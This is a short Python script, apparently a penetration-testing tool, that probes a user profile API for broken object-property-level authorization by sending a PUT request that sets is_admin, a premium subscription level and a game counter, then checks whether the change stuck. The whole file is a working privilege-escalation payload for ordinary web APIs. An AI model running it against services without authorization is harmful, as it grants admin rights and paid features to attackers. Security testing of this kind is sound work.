import requests
import json
import sys


def test_bopla(base_url, api_key, user_session):
    """Test for Broken Object Property Level Authorization in a user profile endpoint"""
    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": 'application/json',
        "User-Session": user_session
    }
    
    # First, get a regular user's profile
    user_response = requests.get(
        f"{base_url}/api/v1/users/profile",
        headers=headers
        )

    if user_response.status_code != 200:
        print(f"Error accessing user profile: {user_response.status_code}")
        return False
    
    user_data = user_response.json()
    user_id = user_data['id']
    print(f"Retrieved user profile for user ID: {user_id}")
    
    # Attempt to modify admin-level properties as a regular user
    exploit_payload = {
        "id": user_id,
        "email": user_data["email"],
        "is_admin": True, # Attempt to escalate privileges
        "subscription_level": "premium", # Attempting to upgrade account
        "streak_freeze_count": 999 # Attept to modify game mechanics
    }

    exploit_response = requests.put(
        f"{base_url}/api/v1/users/profile",
        headers=headers,
        json=exploit_payload
    )
    
    print(f"Exploit attempt response: {exploit_response.status_code}")
    print(f"Response body: {exploit_response.text}")
    
    # Verify if the exploit worked by checking the profile again
    verify_response = requests.get(
        f"{base_url}/api/v1/users/profile",
        headers=headers
    )

    if verify_response.status_code == 200:
        verify_data = verify_response.json()
        if verify_data.get('is_admin') or verify_data.get('subscription_level') == "premium":
            print("VULNERABILITY DETECTED: Successfully modified protected properties")
            return True
        
    print(f"No vulnerability detected or exploit unsuccessful")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python bopla_tester.py <base_url> <api_key> <user_session>")
        sys.exit(1)
        
    base_url = sys.argv[1]
    api_key = sys.argv[2]
    user_session = sys.argv[3]
    
    test_bopla(base_url, api_key, user_session)
